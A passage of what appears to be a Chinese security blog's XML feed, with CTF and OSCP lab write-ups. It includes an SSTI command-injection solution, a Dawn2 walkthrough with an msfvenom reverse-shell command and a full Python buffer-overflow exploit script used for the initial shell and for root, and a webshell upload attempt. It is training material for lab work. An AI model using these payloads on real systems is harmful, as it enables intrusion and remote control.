src="/img/OSCP-driftingblues6/image-20240730221504186.png" alt="image-20240730221504186"></p><p>æˆåŠŸæ·»åŠ ä¸Šäº†ï¼Œsuåˆ°è¿™ä¸ªç”¨æˆ·ï¼ŒæˆåŠŸroot</p><p><img src="/img/OSCP-driftingblues6/image-20240730221543070.png" alt="image-20240730221543070"></p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€CTFç«èµ›ã€‘[HDCTF 2023]SearchMasterâ€”SSTIæ³¨å…¥</title>
      <link href="/2024/07/28/CTF-competition-SSTI-injection/"/>
      <url>/2024/07/28/CTF-competition-SSTI-injection/</url>
      
        <content type="html"><![CDATA[<h1 id="HDCTF-2023-SearchMasterâ€”SSTIæ³¨å…¥"><a href="#HDCTF-2023-SearchMasterâ€”SSTIæ³¨å…¥" class="headerlink" title="[HDCTF 2023]SearchMasterâ€”SSTIæ³¨å…¥"></a>[HDCTF 2023]SearchMasterâ€”SSTIæ³¨å…¥</h1><h2 id="ä¸€ã€çœ‹é¢˜"><a href="#ä¸€ã€çœ‹é¢˜" class="headerlink" title="ä¸€ã€çœ‹é¢˜"></a>ä¸€ã€çœ‹é¢˜</h2><p><img src="/img/CTF-competition-SSTI-injection/image-20240728194430099.png" alt="image-20240728194430099"></p><p>é¡µé¢å¾ˆå¹²å‡€ï¼Œä»€ä¹ˆä¿¡æ¯å‡ ä¹éƒ½æ”¶é›†ä¸åˆ°ï¼Œä½†æ˜¯ç»™äº†ä¸€ä¸ª<code>BUT YOU CAN POST ME A DATA</code>çš„æç¤ºï¼Œæƒ³è®©æˆ‘ä»¬ç»™ä»–ä¸€ä¸ªpost çš„dataè¯·æ±‚</p><h2 id="äºŒã€è§£é¢˜"><a href="#äºŒã€è§£é¢˜" class="headerlink" title="äºŒã€è§£é¢˜"></a>äºŒã€è§£é¢˜</h2><h3 id="1ã€POSTè¯·æ±‚"><a href="#1ã€POSTè¯·æ±‚" class="headerlink" title="1ã€POSTè¯·æ±‚"></a>1ã€POSTè¯·æ±‚</h3><p>é‚£æˆ‘ä»¬ç»™ä»–ä¸€ä¸ªPOSTè¯·æ±‚</p><p><img src="/img/CTF-competition-SSTI-injection/image-20240728194604129.png" alt="image-20240728194604129"></p><p>å‘ç°æˆ‘ä»¬ç»™ä»–ä»€ä¹ˆï¼Œä»–å°±è¾“å‡ºä»€ä¹ˆ</p><h3 id="2ã€éªŒè¯SSTIæ³¨å…¥æ¼æ´"><a href="#2ã€éªŒè¯SSTIæ³¨å…¥æ¼æ´" class="headerlink" title="2ã€éªŒè¯SSTIæ³¨å…¥æ¼æ´"></a>2ã€éªŒè¯SSTIæ³¨å…¥æ¼æ´</h3><p><img src="/img/CTF-competition-SSTI-injection/image-20240728194733538.png" alt="image-20240728194733538"></p>49åšäº†æ‰§è¡Œï¼Œå˜æˆäº†49ï¼Œè¯æ˜å­˜åœ¨SSTIæ³¨å…¥<h3 id="3ã€éªŒè¯æ˜¯å¦æ˜¯-Jinja2-æ¨¡å—"><a href="#3ã€éªŒè¯æ˜¯å¦æ˜¯-Jinja2-æ¨¡å—" class="headerlink" title="3ã€éªŒè¯æ˜¯å¦æ˜¯ Jinja2 æ¨¡å—"></a>3ã€éªŒè¯æ˜¯å¦æ˜¯ Jinja2 æ¨¡å—</h3><p>åªéœ€è¦åš<code>&#123;&#123;7*'7'&#125;&#125;</code>ï¼Œè¿”å›7777777è¡¨ç¤ºæ˜¯ Jinja2 æ¨¡å—</p><blockquote><p>Jinja2 æ¨¡å—è¡¨ç¤ºåç«¯æ˜¯Python</p><p>Twig æ¨¡å—è¡¨ç¤ºåç«¯æ˜¯PHP</p><p>å½“ç„¶ï¼Œé™¤æ­¤ä¹‹å¤–ä¹Ÿå¯ä»¥ç”¨å…¶ä»–æ–¹æ³•åˆ¤æ–­åç«¯è¯­è¨€</p></blockquote><p><img src="/img/CTF-competition-SSTI-injection/image-20240728195206648.png" alt="image-20240728195206648"></p><p>åˆ¤æ–­æ˜¯Twig æ¨¡å—ï¼Œè¡¨ç¤ºåç«¯æ˜¯PHP</p><h3 id="4ã€è§£é¢˜"><a href="#4ã€è§£é¢˜" class="headerlink" title="4ã€è§£é¢˜"></a>4ã€è§£é¢˜</h3><p>ç›´æ¥ä¸€æ­¥åˆ°ä½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(&#x27;ls&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/CTF-competition-SSTI-injection/image-20240728200824653.png" alt="image-20240728200824653"></p><h3 id="5ã€é¢˜è§£ä¹‹å¤–"><a href="#5ã€é¢˜è§£ä¹‹å¤–" class="headerlink" title="5ã€é¢˜è§£ä¹‹å¤–"></a>5ã€é¢˜è§£ä¹‹å¤–</h3><p> å¦‚æœæ˜¯Jinja2 æ¨¡å—ï¼Œæ¨èä½¿ç”¨ç„šé–å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing webui</span><br></pre></td></tr></table></figure><p><img src="/img/CTF-competition-SSTI-injection/image-20240728195435863.png" alt="image-20240728195435863"></p><p>åœ¨å·¦ä¾§é€‰æ‹©postè¯·æ±‚æ–¹å¼ï¼Œè¡¨å•å’Œæ¨¡æ¿ç¯å¢ƒï¼Œå³å¯æ‰§è¡Œï¼Œä¹‹ååœ¨ä¸‹é¢æ‰§è¡Œå‘½ä»¤å³å¯</p>]]></content>
      
      
      <categories>
          
          <category> CTFç«èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœº-Dawn2</title>
      <link href="/2024/07/28/OSCP-Dawn2/"/>
      <url>/2024/07/28/OSCP-Dawn2/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCPç³»åˆ—é¶æœºâ€”dawn2"><a href="#OSCPç³»åˆ—é¶æœºâ€”dawn2" class="headerlink" title="OSCPç³»åˆ—é¶æœºâ€”dawn2"></a>OSCPç³»åˆ—é¶æœºâ€”dawn2</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-Dawn2/image-20240726205020608.png" alt="image-20240726205020608"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><p>1ã€å¿«é€Ÿæ‰«æ</p><p><img src="/img/OSCP-Dawn2/image-20240726205044350.png" alt="image-20240726205044350"></p><p>2ã€å…¨ç«¯å£æ‰«æ</p><p><img src="/img/OSCP-Dawn2/image-20240726205254304.png" alt="image-20240726205254304"></p><p>3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹</p><p><img src="/img/OSCP-Dawn2/image-20240726205342068.png" alt="image-20240726205342068"></p><p>4ã€æ¼æ´æ¢æµ‹</p><p><img src="/img/OSCP-Dawn2/image-20240726205652735.png" alt="image-20240726205652735"></p><p>å‡ ä¹æ²¡ä»€ä¹ˆå‘ç°</p><h2 id="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€é¦–é¡µåŠæºä»£ç "><a href="#1ã€é¦–é¡µåŠæºä»£ç " class="headerlink" title="1ã€é¦–é¡µåŠæºä»£ç "></a>1ã€é¦–é¡µåŠæºä»£ç </h3><p><img src="/img/OSCP-Dawn2/image-20240726205552603.png" alt="image-20240726205552603"></p><p>è¿™é‡Œç»™äº†ä¸€ä¸ªzip çš„å‹ç¼©åŒ…</p><p><img src="/img/OSCP-Dawn2/image-20240726205628385.png" alt="image-20240726205628385"></p><h3 id="2ã€dawn-zipä¿¡æ¯æ”¶é›†"><a href="#2ã€dawn-zipä¿¡æ¯æ”¶é›†" class="headerlink" title="2ã€dawn.zipä¿¡æ¯æ”¶é›†"></a>2ã€dawn.zipä¿¡æ¯æ”¶é›†</h3><p><img src="/img/OSCP-Dawn2/image-20240726205746749.png" alt="image-20240726205746749"></p><p>æœ‰ä¸ªexeè·Ÿ<code>README.txt</code>æ–‡ä»¶</p><p><img src="/img/OSCP-Dawn2/image-20240726205848246.png" alt="image-20240726205848246"></p><p>æ˜‚ï¼ŸDAWN Multi æœåŠ¡çš„å®¢æˆ·ç«¯ï¼›ç”±äºæ˜¯exeï¼Œæ”¾åœ¨æˆ‘çš„æœ¬æœºå°è¯•æ‰§è¡Œ</p><p><img src="/img/OSCP-Dawn2/image-20240726210314566.png" alt="image-20240726210314566"></p><p>æ²¡æ‡‚å•¥æ„æ€ï¼ŒæŸ¥äº†ä¸€ä¸‹DAWN Multi Server çš„ç›¸å…³ä¿¡æ¯</p><blockquote><p>DAWN Multi Server æ˜¯ä¸€ä¸ªå¤šåŠŸèƒ½æœåŠ¡å™¨è§£å†³æ–¹æ¡ˆï¼Œå…·å¤‡å¤šç§æœåŠ¡åŠŸèƒ½ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å…³é”®ç‚¹ï¼š</p><ol><li><strong>é‚®ä»¶æœåŠ¡å™¨</strong>ï¼šæä¾›ä¼ä¸šé‚®å±€æœåŠ¡ã€‚</li><li><strong>DNSæœåŠ¡å™¨</strong>ï¼šè´Ÿè´£åŸŸåè§£æã€‚</li><li><strong>FTPæœåŠ¡å™¨</strong>ï¼šç”¨äºæ–‡ä»¶ä¼ è¾“ã€‚</li><li><strong>è·¯ç”±å™¨å’ŒNATé˜²ç«å¢™</strong>ï¼šæä¾›ç½‘ç»œè·¯ç”±å’Œå®‰å…¨é˜²æŠ¤ã€‚</li><li><strong>DHCPæœåŠ¡å™¨</strong>ï¼šåŠ¨æ€åˆ†é…IPåœ°å€ã€‚</li><li><strong>ç½‘ç«™æœåŠ¡å™¨</strong>ï¼šæ”¯æŒPHPå’ŒMySQLï¼Œå¯ä»¥æ­å»ºç½‘ç«™ã€‚</li><li><strong>ä»£ç†æœåŠ¡å™¨</strong>ï¼šæä¾›ç½‘ç»œä»£ç†æœåŠ¡ã€‚</li><li><strong>NFSç½‘ç»œæ–‡ä»¶æœåŠ¡å™¨</strong>ï¼šç”¨äºæ–‡ä»¶å…±äº«ã€‚</li><li><strong>Sambaè·¨å¹³å°æ–‡ä»¶æœåŠ¡å™¨</strong>ï¼šæ”¯æŒè·¨å¹³å°æ–‡ä»¶å…±äº«ã€‚</li><li><strong>BBSç½‘ç«™</strong>ï¼šæä¾›è®ºå›æœåŠ¡ï¼Œæ¶æ„ä¸ºPHP+MySQLã€‚</li></ol></blockquote><p>æœç´¢ä¸€ä¸‹æœ‰å…³è¯¥æœåŠ¡çš„æ¼æ´</p><p><img src="/img/OSCP-Dawn2/image-20240726211234318.png" alt="image-20240726211234318"></p><p>åœ¨æŸ¥çœ‹é“¾æ¥ä¹‹åï¼Œå¾ˆæ˜¾ç„¶ä¸æ˜¯æˆ‘ä»¬éœ€è¦çš„</p><h3 id="3ã€ç›®å½•æ‰«æ"><a href="#3ã€ç›®å½•æ‰«æ" class="headerlink" title="3ã€ç›®å½•æ‰«æ"></a>3ã€ç›®å½•æ‰«æ</h3><p><img src="/img/OSCP-Dawn2/image-20240726210743593.png" alt="image-20240726210743593"></p><p>å•¥ä¹Ÿæ²¡</p><h3 id="4ã€dawn-exeæŠ˜è…¾"><a href="#4ã€dawn-exeæŠ˜è…¾" class="headerlink" title="4ã€dawn.exeæŠ˜è…¾"></a>4ã€dawn.exeæŠ˜è…¾</h3><p>æœ€åè¿˜æ˜¯å›å½’è¿™ä¸ªdawn.exe</p><p><img src="/img/OSCP-Dawn2/image-20240726212120572.png" alt="image-20240726212120572"></p><p>ä»–ä¸€ç›´å¤„äºä¸€ç§ç›‘å¬çš„æ¨¡å¼ï¼Œå°è¯•ç”¨nc å»è¿æ¥ä»–ï¼›æˆ‘ä»¬éœ€è¦çŸ¥é“å®ƒç›‘å¬çš„ç«¯å£æ˜¯å“ªä¸ªï¼Œè¿™ä¸ªæŸ¥æ‰¾æ–¹å¼æœ‰å¾ˆå¤š</p><p><img src="/img/OSCP-Dawn2/image-20240726212528625.png" alt="image-20240726212528625"></p><p>æ‰¾åˆ°è¿™ä¸ªç¨‹åºå°†ä¼šç›‘å¬åœ¨1985ï¼Œè€Œå‡‘å·§çš„æ˜¯ï¼Œé¶æœºçš„è¿™ä¸ªç«¯å£å¼€æ”¾ä¸”åœ¨ç›‘å¬ï¼›ä½¿ç”¨nc å°è¯•ç«¯å£è¿æ¥</p><p><img src="/img/OSCP-Dawn2/image-20240726212827414.png" alt="image-20240726212827414"></p><p>ä¼¼ä¹æœ‰ååº”ï¼Œå°è¯•ç¼–å†™è„šæœ¬</p><p><img src="/img/OSCP-Dawn2/image-20240726215142768.png" alt="image-20240726215142768"></p><p>å™¢ï¼Œæœ‰ç‚¹ååº”ï¼Œç»§ç»­å°è¯•ï¼›ç»§ç»­å°è¯•ï¼Œå‘ç°å®ƒç»å¸¸æ€§çš„å¡å£³ï¼Œå°±å¦‚åŒ<code>README.txt</code>å†™çš„é‚£æ ·</p><p><img src="/img/OSCP-Dawn2/image-20240726220500965.png" alt="image-20240726220500965"></p><h2 id="å››ã€Getshell"><a href="#å››ã€Getshell" class="headerlink" title="å››ã€Getshell"></a>å››ã€Getshell</h2><p>æœ€åæˆ‘ä»¬éœ€è¦æå‡ºæ¥msf çš„payloadï¼Œä¹‹åå»åŠ è½½æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.101 LPORT=8888 -f c -b &#x27;\x00&#x27; EXITFUNC=thread</span><br></pre></td></tr></table></figure><p>payloadï¼Œæ›¿æ¢buffå’Œipã€ç«¯å£å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">buff = (&quot;\xda\xde\xd9\x74\x24\xf4\x58\xbe\x7f\x77\xb1\x99\x2b\xc9&quot;</span><br><span class="line">&quot;\xb1\x12\x31\x70\x17\x03\x70\x17\x83\x97\x8b\x53\x6c\x56&quot;</span><br><span class="line">&quot;\xaf\x63\x6c\xcb\x0c\xdf\x19\xe9\x1b\x3e\x6d\x8b\xd6\x41&quot;</span><br><span class="line">&quot;\x1d\x0a\x59\x7e\xef\x2c\xd0\xf8\x16\x44\x23\x52\xd0\xf1&quot;</span><br><span class="line">&quot;\xcb\xa1\x21\xdb\xb3\x2f\xc0\xab\xa2\x7f\x52\x98\x99\x83&quot;</span><br><span class="line">&quot;\xdd\xff\x13\x03\x8f\x97\xc5\x2b\x43\x0f\x72\x1b\x8c\xad&quot;</span><br><span class="line">&quot;\xeb\xea\x31\x63\xbf\x65\x54\x33\x34\xbb\x17&quot;)</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot; * 272 + &quot;\x77\x17\x58\x34&quot;  + &quot;\x90&quot; * 32 + buff + &quot;\x00&quot;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((&#x27;192.168.56.105&#x27;, 1985))</span><br><span class="line">    s.send(payload)</span><br><span class="line">    s.close()</span><br><span class="line">    print(&quot;payload send successfully&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(e)</span><br><span class="line">print(&quot;error&quot;)</span><br></pre></td></tr></table></figure><p>æˆåŠŸgetshell</p><p><img src="/img/OSCP-Dawn2/image-20240726223809041.png" alt="image-20240726223809041"></p><h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><h3 id="1ã€ä¿¡æ¯æ”¶é›†"><a href="#1ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€ä¿¡æ¯æ”¶é›†"></a>1ã€ä¿¡æ¯æ”¶é›†</h3><p><img src="/img/OSCP-Dawn2/image-20240726224305145.png" alt="image-20240726224305145"></p><p>æœ‰ä¸€ä¸ªè·Ÿdawn.exe å·®ä¸å¤šçš„å…¨rootçš„dawn-BETA.exe æ–‡ä»¶æ¬¸</p><p>ä¸‹è½½åˆ°æœ¬åœ°å°è¯•æ‰§è¡Œ</p><p><img src="/img/OSCP-Dawn2/image-20240726224634962.png" alt="image-20240726224634962"></p><p>è·Ÿå“ªä¸ªdawn.exe ä¸€æ ·æ¬¸ï¼Œçœ‹ç›‘å¬åœ¨å“ªä¸ªç«¯å£</p><p><img src="/img/OSCP-Dawn2/image-20240726224945062.png" alt="image-20240726224945062"></p><p>1435ï¼Œçœ‹æ¥æ˜¯å‰©ä¸‹çš„é‚£ä¸ªç«¯å£ï¼Œç”¨åŒæ ·æ–¹æ³•å†æ¥ä¸€éå³å¯ææƒåˆ°root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">buff = (&quot;\xda\xde\xd9\x74\x24\xf4\x58\xbe\x7f\x77\xb1\x99\x2b\xc9&quot;</span><br><span class="line">&quot;\xb1\x12\x31\x70\x17\x03\x70\x17\x83\x97\x8b\x53\x6c\x56&quot;</span><br><span class="line">&quot;\xaf\x63\x6c\xcb\x0c\xdf\x19\xe9\x1b\x3e\x6d\x8b\xd6\x41&quot;</span><br><span class="line">&quot;\x1d\x0a\x59\x7e\xef\x2c\xd0\xf8\x16\x44\x23\x52\xd0\xf1&quot;</span><br><span class="line">&quot;\xcb\xa1\x21\xdb\xb3\x2f\xc0\xab\xa2\x7f\x52\x98\x99\x83&quot;</span><br><span class="line">&quot;\xdd\xff\x13\x03\x8f\x97\xc5\x2b\x43\x0f\x72\x1b\x8c\xad&quot;</span><br><span class="line">&quot;\xeb\xea\x31\x63\xbf\x65\x54\x33\x34\xbb\x17&quot;)</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot; * 272 + &quot;\x77\x17\x58\x34&quot;  + &quot;\x90&quot; * 32 + buff + &quot;\x00&quot;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((&#x27;192.168.56.105&#x27;, 1435))</span><br><span class="line">    s.send(payload)</span><br><span class="line">    s.close()</span><br><span class="line">    print(&quot;payload send successfully&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(e)</span><br><span class="line">print(&quot;error&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”BBS-Cute</title>
      <link href="/2024/07/25/OSCP-BBS-Cute/"/>
      <url>/2024/07/25/OSCP-BBS-Cute/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCPç³»åˆ—é¶æœºâ€”BBS-Cute"><a href="#OSCPç³»åˆ—é¶æœºâ€”BBS-Cute" class="headerlink" title="OSCPç³»åˆ—é¶æœºâ€”BBS-Cute"></a>OSCPç³»åˆ—é¶æœºâ€”BBS-Cute</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-BBS-Cute/image-20240725191241484.png" alt="image-20240725191241484"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><p>1ã€å¿«é€Ÿæ‰«æ</p><p><img src="/img/OSCP-BBS-Cute/image-20240725191321528.png" alt="image-20240725191321528"></p><p>2ã€å…¨ç«¯å£æ‰«æ</p><p><img src="/img/OSCP-BBS-Cute/image-20240725191602485.png" alt="image-20240725191602485"></p><p>3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -sC -O -p 22,80,88,110,995 192.168.56.104</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BBS-Cute/image-20240725191705700.png" alt="image-20240725191705700"></p><p>88ç«¯å£å¼€äº†ä¸€ä¸ªhttpæœåŠ¡ï¼Œä½†æ ‡é¢˜ç¡®å®404æœªæ‰¾åˆ°ï¼Œ110å’Œ995æ˜¯POP3æœåŠ¡ï¼Œå¯èƒ½å­˜åœ¨ä¸€äº›ä¿¡æ¯</p><p>4ã€æ¼æ´æ¢æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p 22,80,88,110,995 192.168.56.104</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BBS-Cute/image-20240725192231998.png" alt="image-20240725192231998"></p><p>80ç«¯å£å‘ç°äº†ä¸€äº›ç›®å½•ï¼›è¯¶è¯¶ï¼Œè¿™ä¸ª88ç«¯å£çš„æœåŠ¡æ€ä¹ˆå˜äº†ï¼Œè€Œä¸”å¼€æ”¾çš„è¿˜æ˜¯kerberosæœåŠ¡</p><h2 id="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€é¦–é¡µåŠæºä»£ç "><a href="#1ã€é¦–é¡µåŠæºä»£ç " class="headerlink" title="1ã€é¦–é¡µåŠæºä»£ç "></a>1ã€é¦–é¡µåŠæºä»£ç </h3><p><img src="/img/OSCP-BBS-Cute/image-20240725192034199.png" alt="image-20240725192034199"></p><p>Apache2çš„é¦–é¡µï¼Œåº”è¯¥æ‹¿ä¸åˆ°ä»€ä¹ˆä¿¡æ¯</p><h3 id="2ã€ç›®å½•æ‰«æ"><a href="#2ã€ç›®å½•æ‰«æ" class="headerlink" title="2ã€ç›®å½•æ‰«æ"></a>2ã€ç›®å½•æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.56.104/ -x 404,403</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BBS-Cute/image-20240725192210604.png" alt="image-20240725192210604"></p><p>æœ‰å¾ˆå¤šç›®å½•å’Œæ–‡ä»¶</p><h3 id="3ã€index-phpæ–‡ä»¶"><a href="#3ã€index-phpæ–‡ä»¶" class="headerlink" title="3ã€index.phpæ–‡ä»¶"></a>3ã€index.phpæ–‡ä»¶</h3><p><img src="/img/OSCP-BBS-Cute/image-20240725193140677.png" alt="image-20240725193140677"></p><p>ä¸€ä¸ªç™»é™†ç‚¹ï¼ŒåŒæ—¶åœ¨è¿™é‡Œç»™åˆ°äº†ä¸€ä¸ªç‰ˆæœ¬å·ï¼š2.1.2ï¼›ç¬¬ä¸€æ—¶é—´å½“ç„¶æ˜¯æœç´¢æœ‰æ— æ¼æ´äº†</p><p><img src="/img/OSCP-BBS-Cute/image-20240725193923653.png" alt="image-20240725193923653"></p><p>æˆ‘ä»¬å¯¹ç¬¬å››ä¸ªéå¸¸æ„Ÿå…´è¶£ï¼Œå°è¯•æ‰§è¡Œï¼Œæ²¡æœ‰ä¸œè¥¿</p><p><img src="/img/OSCP-BBS-Cute/image-20240725202632179.png" alt="image-20240725202632179"></p><h3 id="4ã€æ–‡ä»¶ä¸Šä¼ å°è¯•"><a href="#4ã€æ–‡ä»¶ä¸Šä¼ å°è¯•" class="headerlink" title="4ã€æ–‡ä»¶ä¸Šä¼ å°è¯•"></a>4ã€æ–‡ä»¶ä¸Šä¼ å°è¯•</h3><p><img src="/img/OSCP-BBS-Cute/image-20240725204919639.png" alt="image-20240725204919639"></p><p>è¿™é‡Œç»™äº†æ–‡ä»¶ä¸Šä¼ çš„POCï¼Œä½†æ˜¯åˆ©ç”¨æäº¤æ˜¯éœ€è¦ä¸€ä¸ªä¸Šä¼ ç‚¹ï¼Œé‚£è¿™é‡Œéœ€è¦ç™»é™†åå°å»å…ˆï¼›æ³¨å†Œç”¨æˆ·ç™»é™†åå°</p><p><img src="/img/OSCP-BBS-Cute/image-20240725205528454.png" alt="image-20240725205528454"></p><p>æ³¨å†ŒæˆåŠŸï¼Œæ¥åˆ°åå°ï¼›åœ¨æ³¨å†Œä¸­çš„éªŒè¯ç éœ€è¦bpæŠ“åŒ…æŸ¥çœ‹ï¼›ä¹‹åæ‰¾æ–‡ä»¶ä¸Šä¼ çš„ç‚¹</p><p><img src="/img/OSCP-BBS-Cute/image-20240725205749405.png" alt="image-20240725205749405"></p><p>è¿›æ¥ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°æ­£å¥½æœ‰ä¸Šä¼ çš„ç‚¹</p><p><img src="/img/OSCP-BBS-Cute/image-20240725205822531.png" alt="image-20240725205822531"></p><p>æŒ‰ç…§POCçš„æ­¥éª¤å°è¯•ä¸Šä¼ ï¼›å…ˆå†™ä¸€ä¸ªwebshellï¼Œä¸Šä¼ æŠ“åŒ…åæ”¹åŒ…</p><p><img src="/img/OSCP-BBS-Cute/image-20240725204954003.png" alt="image-20240725204954003"></p><p>æ”¹ä¸ºphpåç¼€</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210038266.png" alt="image-20240725210038266"></p><p>ç»™äº†ä¸ªæŠ¥é”™ï¼Œè¯´å¤´åƒä¸åˆæ ¼</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210108029.png" alt="image-20240725210108029"></p><p>åº”è¯¥æ˜¯æœ‰æ£€æµ‹æœºåˆ¶ï¼Œæˆ‘ä»¬å†™å…¥ä¸€ä¸ªçœŸæ­£çš„å›¾ç‰‡ä¸­å»</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210315667.png" alt="image-20240725210315667"></p><p>æ›´æ”¹åç¼€ï¼Œå•Šï¼Œåˆæœ‰æ–°çš„æƒ…å†µï¼›æ˜¯ä¸€ä¸ªcsrf çš„é˜²å¾¡æœºåˆ¶ï¼Œè¿™ä¸ªæˆ‘ä»¬é‡æ–°æŠ“åŒ…æ¥ä¸€éå³å¯</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210355998.png" alt="image-20240725210355998"></p><p>æˆåŠŸä¸Šä¼ </p><p><img src="/img/OSCP-BBS-Cute/image-20240725210556143.png" alt="image-20240725210556143"></p><p>é‚£ä¸Šä¼ åˆ°ä»€ä¹ˆä½ç½®äº†å‘¢ï¼Ÿä¹‹å‰çœ‹åˆ°æœ‰ä¸ª<code>uploads</code>çš„ç›®å½•ï¼Œå°è¯•æ‰§è¡Œå‘½ä»¤</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210813322.png" alt="image-20240725210813322"></p><p>æ‰§è¡Œå¤±è´¥äº†ï¼Œå¯èƒ½æ˜¯æœ¨é©¬æœ‰é—®é¢˜ï¼Œé‡æ–°å°è¯•ï¼›ä¸å¯¹ï¼Œçœ‹åˆ°æ–‡ä»¶çš„ä¸Šä¼ ç‚¹å±…ç„¶åœ¨å¦ä¸€ä¸ªåŸŸå</p><p><img src="/img/OSCP-BBS-Cute/image-20240725213434128.png" alt="image-20240725213434128"></p><h2 id="å››ã€Getshell"><a href="#å››ã€Getshell" class="headerlink" title="å››ã€Getshell"></a>å››ã€Getshell</h2><p>é‡æ–°è¿”å›å»çœ‹ä¹‹å‰å‘½ä»¤æ‰§è¡Œçš„py æ–‡ä»¶ï¼Œåœ¨ç¿»çœ‹äº†æºä»£ç 